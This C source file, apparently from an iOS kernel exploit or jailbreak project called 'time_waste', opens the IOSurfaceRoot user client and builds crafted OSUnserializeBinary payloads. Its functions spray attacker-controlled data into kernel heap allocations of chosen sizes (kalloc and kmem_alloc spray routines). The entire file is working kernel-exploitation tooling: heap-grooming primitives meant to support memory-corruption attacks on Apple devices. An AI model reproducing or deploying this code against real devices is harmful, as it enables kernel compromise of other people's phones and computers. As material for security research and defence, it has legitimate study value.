//
//  IOSurface_stuff.c
//  time_waste
//
//  Created by Jake James on 2/22/20.
//  Copyright © 2020 Jake James. All rights reserved.
//

#import "IOSurface_stuff.h"
#include <common.h>

uint32_t pagesize = 0;
io_connect_t IOSurfaceRootService = IO_OBJECT_NULL;
io_service_t IOSurfaceRootUserClientPort = IO_OBJECT_NULL;
uint32_t IOSurface_ID = 0;

int init_IOSurface() {
    kern_return_t ret = _host_page_size(mach_host_self(), (vm_size_t*)&pagesize);
    if (ret) {
        RAWLOG("[-] Failed to get page size! 0x%x (%s)", ret, mach_error_string(ret));
        return ret;
    }
    
    RAWLOG("[i] page size: 0x%x", pagesize);
    
    IOSurfaceRootService = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!MACH_PORT_VALID(IOSurfaceRootService)) {
        RAWLOG("[-] Failed to find IOSurfaceRoot service");
        return KERN_FAILURE;
    }
    
    ret = IOServiceOpen(IOSurfaceRootService, mach_task_self(), 0, &IOSurfaceRootUserClientPort);
    if (ret || !MACH_PORT_VALID(IOSurfaceRootUserClientPort)) {
        RAWLOG("[-] Failed to open IOSurfaceRootUserClientPort: 0x%x (%s)", ret, mach_error_string(ret));
        return ret;
    }
    
    struct IOSurfaceFastCreateArgs create_args = {
        .alloc_size = pagesize
    };
    
    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = koffset(IOSURFACE_CREATE_OUTSIZE);
    
    ret = IOConnectCallMethod(IOSurfaceRootUserClientPort, IOSurfaceRootUserClient_create_surface_selector, NULL, 0, &create_args, sizeof(create_args), NULL, NULL, &lock_result, &lock_result_size);
    if (ret) {
        RAWLOG("[-] Failed to create IOSurfaceClient: 0x%x (%s)", ret, mach_error_string(ret));
        return ret;
    }
    
    IOSurface_ID = lock_result.surface_id;
    
    return 0;
}

int IOSurface_setValue(struct IOSurfaceValueArgs *args, size_t args_size) {
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    
    kern_return_t ret = IOConnectCallMethod(IOSurfaceRootUserClientPort, IOSurfaceRootUserClient_set_value_selector, NULL, 0, args, args_size, NULL, NULL, &result, &result_size);
    if (ret) {
        RAWLOG("[-][IOSurface] Failed to set value: 0x%x (%s)", ret, mach_error_string(ret));
        return ret;
    }
    return 0;
}

int IOSurface_getValue(struct IOSurfaceValueArgs *args, int args_size, struct IOSurfaceValueArgs *output, size_t *out_size) {
    kern_return_t ret = IOConnectCallMethod(IOSurfaceRootUserClientPort, IOSurfaceRootUserClient_get_value_selector, NULL, 0, args, args_size, NULL, NULL, output, out_size);
    if (ret) {
        RAWLOG("[-][IOSurface] Failed to get value: 0x%x (%s)", ret, mach_error_string(ret));
        return ret;
    }
    return 0;
}

int IOSurface_removeValue(struct IOSurfaceValueArgs *args, size_t args_size) {
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    
    kern_return_t ret = IOConnectCallMethod(IOSurfaceRootUserClientPort, IOSurfaceRootUserClient_remove_value_selector, NULL, 0, args, args_size, NULL, NULL, &result, &result_size);
    if (ret) {
        RAWLOG("[-][IOSurface] Failed to remove value: 0x%x (%s)", ret, mach_error_string(ret));
        return ret;
    }
    return 0;
}

int IOSurface_removeProperty(uint32_t key) {
    struct IOSurfaceValueArgs args = {
        .surface_id = IOSurface_ID
    };
    args.binary[0] = key;
    args.binary[1] = 0;
    return IOSurface_removeValue(&args, 16);
}

int IOSurface_kalloc(void *data, uint32_t size, uint32_t kalloc_key) {
    if (size - 1 > 0x00ffffff) {
        RAWLOG("[-][IOSurface] Size too big for OSUnserializeBinary");
        return KERN_FAILURE;
    }
    
    size_t args_size = sizeof(struct IOSurfaceValueArgs) + ((size + 3)/4) * 4 + 6 * 4;
    
    struct IOSurfaceValueArgs *args = calloc(1, args_size);
    args->surface_id = IOSurface_ID;
    
    int i = 0;
    args->binary[i++] = kOSSerializeBinarySignature;
    args->binary[i++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeString | (size - 1);
    memcpy(&args->binary[i], data, size);
    i += (size + 3)/4;
    args->binary[i++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->binary[i++] = kalloc_key;
    args->binary[i++] = 0;
    
    kern_return_t ret = IOSurface_setValue(args, args_size);
    free(args);
    return ret;
}

int IOSurface_kalloc_spray(void *data, uint32_t size, int count, uint32_t kalloc_key) {
    if (size - 1 > 0x00ffffff) {
        RAWLOG("[-][IOSurface] Size too big for OSUnserializeBinary");
        return KERN_FAILURE;
    }
    if (count > 0x00ffffff) {
        RAWLOG("[-][IOSurface] Count too big for OSUnserializeBinary");
        return KERN_FAILURE;
    }
    
    size_t args_size = sizeof(struct IOSurfaceValueArgs) + count * (((size + 3)/4) * 4) + 6 * 4 * count * 4;
    
    struct IOSurfaceValueArgs *args = calloc(1, args_size);
    args->surface_id = IOSurface_ID;
    
    int i = 0;
    args->binary[i++] = kOSSerializeBinarySignature;
    args->binary[i++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeArray | count;
    for (int c = 0; c < count; c++) {
        args->binary[i++] = kOSSerializeString | (size - 1) | ((c == count - 1) ? kOSSerializeEndCollection : 0);
        memcpy(&args->binary[i], data, size);
        i += (size + 3)/4;
    }
    args->binary[i++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->binary[i++] = kalloc_key;
    args->binary[i++] = 0;
    
    kern_return_t ret = IOSurface_setValue(args, args_size);
    free(args);
    return ret;
}

int IOSurface_empty_kalloc(uint32_t size, uint32_t kalloc_key) {
    uint32_t capacity = size / 16;
    
    if (capacity > 0x00ffffff) {
        RAWLOG("[-][IOSurface] Size too big for OSUnserializeBinary");
        return KERN_FAILURE;
    }
    
    size_t args_size = sizeof(struct IOSurfaceValueArgs) + 9 * 4;
    
    struct IOSurfaceValueArgs *args = calloc(1, args_size);
    args->surface_id = IOSurface_ID;
    
    int i = 0;
    args->binary[i++] = kOSSerializeBinarySignature;
    args->binary[i++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeDictionary | capacity;
    args->binary[i++] = kOSSerializeSymbol | 4;
    args->binary[i++] = 0x00aabbcc;
    args->binary[i++] = kOSSerializeBoolean | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->binary[i++] = kalloc_key;
    args->binary[i++] = 0;
    
    kern_return_t ret = IOSurface_setValue(args, args_size);
    free(args);
    return ret;
}

int IOSurface_kmem_alloc(void *data, uint32_t size, uint32_t kalloc_key) {
    if (size < pagesize) {
        RAWLOG("[-][IOSurface] Size too small for kmem_alloc");
        return KERN_FAILURE;
    }
    if (size > 0x00ffffff) {
        RAWLOG("[-][IOSurface] Size too big for OSUnserializeBinary");
        return KERN_FAILURE;
    }
    
    size_t args_size = sizeof(struct IOSurfaceValueArgs) + ((size + 3)/4) * 4 + 6 * 4;
    
    struct IOSurfaceValueArgs *args = calloc(1, args_size);
    args->surface_id = IOSurface_ID;
    
    int i = 0;
    args->binary[i++] = kOSSerializeBinarySignature;
    args->binary[i++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeData | size;
    memcpy(&args->binary[i], data, size);
    i += (size + 3)/4;
    args->binary[i++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->binary[i++] = kalloc_key;
    args->binary[i++] = 0;
    
    kern_return_t ret = IOSurface_setValue(args, args_size);
    free(args);
    return ret;
}

int IOSurface_kmem_alloc_spray(void *data, uint32_t size, int count, uint32_t kalloc_key) {
    if (size < pagesize) {
        RAWLOG("[-][IOSurface] Size too small for kmem_alloc");
        return KERN_FAILURE;
    }
    if (size > 0x00ffffff) {
        RAWLOG("[-][IOSurface] Size too big for OSUnserializeBinary");
        return KERN_FAILURE;
    }
    if (count > 0x00ffffff) {
        RAWLOG("[-][IOSurface] Size too big for OSUnserializeBinary");
        return KERN_FAILURE;
    }
    
    size_t args_size = sizeof(struct IOSurfaceValueArgs) + count * (((size + 3)/4) * 4) + 6 * 4 * count * 4;
    
    struct IOSurfaceValueArgs *args = calloc(1, args_size);
    args->surface_id = IOSurface_ID;
    
    int i = 0;
    args->binary[i++] = kOSSerializeBinarySignature;
    args->binary[i++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeArray | count;
    for (int c = 0; c < count; c++) {
        args->binary[i++] = kOSSerializeData | size | ((c == count - 1) ? kOSSerializeEndCollection : 0);
        memcpy(&args->binary[i], data, size);
        i += (size + 3)/4;
    }
    args->binary[i++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->binary[i++] = kalloc_key;
    args->binary[i++] = 0;
    
    kern_return_t ret = IOSurface_setValue(args, args_size);
    free(args);
    return ret;
}

void term_IOSurface() {
    if (IOSurfaceRootService) IOObjectRelease(IOSurfaceRootService);
    if (IOSurfaceRootUserClientPort) IOServiceClose(IOSurfaceRootUserClientPort);
    
    IOSurfaceRootService = 0;
    IOSurfaceRootUserClientPort = 0;
    IOSurface_ID = 0;
}
